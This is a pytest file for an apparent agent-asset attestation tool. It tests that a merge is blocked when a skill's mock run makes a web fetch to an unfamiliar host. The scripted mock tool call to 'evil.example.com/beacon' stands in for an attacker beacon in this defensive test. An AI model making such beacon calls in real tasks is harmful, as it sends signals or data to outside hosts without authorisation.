from pathlib import Path

import pytest

from reagent.attestation import (
    AttestationStore,
    CounterfactualGate,
)
from reagent.attestation.models import sign_fingerprint
from reagent.ci.runner import _determine_exit_code
from reagent.sandbox.capture import events_to_fingerprint
from reagent.sandbox.corpus import Probe, PromptCorpus
from reagent.sandbox.drivers import DriverEvent, DriverEventKind, MockDriver
from reagent.security.trust import TrustLevel


def _tool(name: str, **args: object) -> DriverEvent:
    return DriverEvent(
        kind=DriverEventKind.TOOL_CALL, tool_name=name, tool_args=dict(args)
    )


@pytest.fixture()
def asset_file(tmp_path: Path) -> Path:
    path = tmp_path / "skill.md"
    path.write_text("# baseline skill\n")
    return path


def test_new_egress_blocks_merge(
    asset_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("REAGENT_DB_PATH", str(tmp_path / "reagent.db"))
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

    baseline_corpus = PromptCorpus(probes=[Probe(id="p", prompt="probe")])
    baseline_events = {
        "probe": [
            _tool("Read", path="README.md"),
            _tool("WebFetch", url="https://api.anthropic.com/v1/messages"),
        ]
    }
    baseline_fp = events_to_fingerprint(baseline_events["probe"])
    baseline_record = sign_fingerprint(
        fingerprint=baseline_fp,
        asset_content_hash="ff" * 32,
        harness="claude-code",
        corpus_hash=baseline_corpus.hash(),
        signing_key=Ed25519PrivateKey.generate(),
        trust_level=TrustLevel.REVIEWED,
    )
    AttestationStore().save(baseline_record)

    new_corpus = baseline_corpus
    new_driver = MockDriver(
        scripted={
            "probe": [
                _tool("Read", path="README.md"),
                _tool("WebFetch", url="https://evil.example.com/beacon"),
            ]
        }
    )
    gate = CounterfactualGate(driver=new_driver, corpus=new_corpus, timeout_seconds=1)
    result = gate.evaluate(baseline=baseline_record, new_asset_path=asset_file)

    assert result.blocks_merge is True
    egress = next(
        f for f in result.divergence_findings if f.dimension == "egress_hosts"
    )
    assert "evil.example.com" in egress.observed

    serialised = [f.model_dump(mode="json") for f in result.divergence_findings]
    assert (
        _determine_exit_code(
            asset_results=[],
            security_grade="A",
            security_enabled=True,
            behavioral_findings=serialised,
        )
        == 3
    )
